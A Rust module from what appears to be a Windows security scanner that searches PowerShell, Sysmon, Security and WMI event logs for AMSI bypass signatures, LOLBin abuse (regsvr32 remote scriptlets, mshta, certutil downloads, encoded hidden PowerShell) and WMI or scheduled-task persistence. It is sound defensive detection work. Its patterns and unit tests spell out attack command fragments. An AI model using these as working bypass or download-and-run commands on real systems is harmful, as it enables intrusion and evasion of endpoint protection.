use std::collections::HashSet;

use crate::bypass_scan::logger::JsonLogger;
use crate::bypass_scan::types::{BypassResult, Confidence, DetectionStatus, EvidenceItem};
use crate::bypass_scan::utils::{query_event_records, truncate_text};

pub fn run(_ctx: &crate::bypass_scan::context::ScanContext, logger: &JsonLogger) -> BypassResult {
    let mut result = BypassResult::clean(
        32,
        "bypass32_fileless_amsi_lolbins",
        "Fileless persistence / AMSI bypass / LOLBins",
        "No high-confidence AMSI-bypass or fileless LOLBin chain evidence found.",
    );

    let ps_events = query_event_records(
        "Microsoft-Windows-PowerShell/Operational",
        &[4103, 4104],
        320,
    );
    let sec_events = query_event_records("Security", &[4688, 4698], 360);
    let sysmon_proc_events = query_event_records("Microsoft-Windows-Sysmon/Operational", &[1], 280);
    let sysmon_wmi_events =
        query_event_records("Microsoft-Windows-Sysmon/Operational", &[19, 20, 21], 220);
    let wmi_activity_events = query_event_records(
        "Microsoft-Windows-WMI-Activity/Operational",
        &[5857, 5858, 5861],
        260,
    );

    let mut amsi_hits = Vec::new();
    let mut lolbin_hits = Vec::new();
    let mut lolbin_classes: HashSet<&'static str> = HashSet::new();
    let mut fileless_persist_hits = Vec::new();

    for ev in ps_events
        .iter()
        .chain(sec_events.iter())
        .chain(sysmon_proc_events.iter())
    {
        let text = format!("{} {}", ev.message, ev.raw_xml).to_lowercase();

        if is_amsi_bypass_signature(&text) {
            amsi_hits.push(format!(
                "{} | Event {} | {}",
                ev.time_created,
                ev.event_id,
                truncate_text(&ev.message, 220)
            ));
            continue;
        }

        if let Some(class) = lolbin_class(&text) {
            lolbin_classes.insert(class);
            lolbin_hits.push(format!(
                "{} | {} | {}",
                ev.time_created,
                class,
                truncate_text(&ev.message, 180)
            ));
        }
    }

    for ev in sysmon_wmi_events.iter().chain(wmi_activity_events.iter()) {
        let text = format!("{} {}", ev.message, ev.raw_xml).to_lowercase();
        if looks_like_fileless_persistence(&text) {
            fileless_persist_hits.push(format!(
                "{} | Event {} | {}",
                ev.time_created,
                ev.event_id,
                truncate_text(&ev.message, 220)
            ));
        }
    }

    if !amsi_hits.is_empty() {
        result.status = DetectionStatus::Detected;
        result.confidence = Confidence::High;
        result.summary = "Detected explicit AMSI bypass script/command patterns.".to_string();
    } else if lolbin_classes.len() >= 2 && !fileless_persist_hits.is_empty() {
        result.status = DetectionStatus::Detected;
        result.confidence = Confidence::High;
        result.summary =
            "Correlated fileless persistence telemetry with multiple suspicious LOLBin classes."
                .to_string();
    } else if lolbin_classes.len() >= 2 {
        result.status = DetectionStatus::Detected;
        result.confidence = Confidence::Medium;
        result.summary =
            "Multiple suspicious LOLBin execution patterns found (fileless tradecraft risk)."
                .to_string();
    } else if !fileless_persist_hits.is_empty() {
        result.status = DetectionStatus::Detected;
        result.confidence = Confidence::Medium;
        result.summary =
            "WMI/task persistence indicators detected without direct AMSI bypass signature."
                .to_string();
    } else if !lolbin_hits.is_empty() {
        result.status = DetectionStatus::Detected;
        result.confidence = Confidence::Low;
        result.summary = "Single LOLBin/fileless indicator detected in telemetry.".to_string();
    }

    if !amsi_hits.is_empty() {
        result.evidence.push(EvidenceItem {
            source: "PowerShell/Security/Sysmon command telemetry".to_string(),
            summary: format!("{} AMSI bypass hit(s)", amsi_hits.len()),
            details: amsi_hits.join("; "),
        });
    }

    if !lolbin_hits.is_empty() {
        result.evidence.push(EvidenceItem {
            source: "LOLBin execution telemetry".to_string(),
            summary: format!(
                "{} suspicious LOLBin event(s) across {} class(es)",
                lolbin_hits.len(),
                lolbin_classes.len()
            ),
            details: lolbin_hits.join("; "),
        });
    }

    if !fileless_persist_hits.is_empty() {
        result.evidence.push(EvidenceItem {
            source: "WMI/Task persistence telemetry".to_string(),
            summary: format!(
                "{} fileless persistence event(s)",
                fileless_persist_hits.len()
            ),
            details: fileless_persist_hits.join("; "),
        });
    }

    logger.log(
        "bypass32_fileless_amsi_lolbins",
        "info",
        "amsi/lolbin checks complete",
        serde_json::json!({
            "amsi_hits": amsi_hits.len(),
            "lolbin_hits": lolbin_hits.len(),
            "lolbin_classes": lolbin_classes.len(),
            "fileless_persist_hits": fileless_persist_hits.len(),
            "status": result.status.as_label(),
        }),
    );

    result
}

fn is_amsi_bypass_signature(text: &str) -> bool {
    let normalized = text.to_lowercase();
    (normalized.contains("system.management.automation.amsiutils")
        && normalized.contains("amsiinitfailed"))
        || (normalized.contains("amsiscanbuffer") && normalized.contains("kernel32"))
        || (normalized.contains("[ref].assembly.gettype") && normalized.contains("amsi"))
        || (normalized.contains("setvalue($null,$true)") && normalized.contains("amsi"))
        || (normalized.contains("amsi") && normalized.contains("virtualprotect"))
        || (normalized.contains("patch")
            && normalized.contains("amsi")
            && normalized.contains("memory"))
}

fn lolbin_class(text: &str) -> Option<&'static str> {
    let normalized = text.to_lowercase();
    if normalized.contains("regsvr32") && normalized.contains("/i:http") {
        return Some("regsvr32_remote_scriptlet");
    }
    if normalized.contains("mshta")
        && (normalized.contains("http://")
            || normalized.contains("https://")
            || normalized.contains("javascript:"))
    {
        return Some("mshta_remote_or_js");
    }
    if normalized.contains("rundll32")
        && (normalized.contains("javascript:") || normalized.contains(",dllregisterserver"))
    {
        return Some("rundll32_script_or_register");
    }
    if normalized.contains("certutil")
        && normalized.contains("-urlcache")
        && normalized.contains("-split")
    {
        return Some("certutil_download");
    }
    if normalized.contains("powershell")
        && (normalized.contains("-enc") || normalized.contains("-encodedcommand"))
        && (normalized.contains("-w hidden") || normalized.contains("-windowstyle hidden"))
    {
        return Some("powershell_encoded_hidden");
    }
    if normalized.contains("msbuild")
        && (normalized.contains(".xml") || normalized.contains("inline task"))
    {
        return Some("msbuild_inline_task");
    }
    if normalized.contains("installutil")
        && (normalized.contains("/logfile=") || normalized.contains("/u"))
    {
        return Some("installutil_abuse");
    }
    None
}

fn looks_like_fileless_persistence(text: &str) -> bool {
    let normalized = text.to_lowercase();
    (normalized.contains("__eventfilter")
        || normalized.contains("commandlineeventconsumer")
        || normalized.contains("__filtertoconsumerbinding"))
        || (normalized.contains("schtasks")
            && (normalized.contains("/create") || normalized.contains("taskname")))
        || (normalized.contains("event trigger") && normalized.contains("task"))
}

#[cfg(test)]
mod tests {
    use super::{is_amsi_bypass_signature, lolbin_class, looks_like_fileless_persistence};

    #[test]
    fn amsi_signature_detects_common_patch_pattern() {
        assert!(is_amsi_bypass_signature(
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ));
        assert!(!is_amsi_bypass_signature("Write-Host hello"));
    }

    #[test]
    fn lolbin_classification_works_for_mshta_and_regsvr32() {
        assert_eq!(
            lolbin_class("mshta https://example.com/a.hta"),
            Some("mshta_remote_or_js")
        );
        assert_eq!(
            lolbin_class("regsvr32 /s /n /u /i:http://x scrobj.dll"),
            Some("regsvr32_remote_scriptlet")
        );
        assert_eq!(lolbin_class("notepad.exe"), None);
    }

    #[test]
    fn fileless_persistence_matcher_detects_wmi_subscription() {
        assert!(looks_like_fileless_persistence(
            "__EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding"
        ));
        assert!(!looks_like_fileless_persistence("Get-Service"));
    }
}
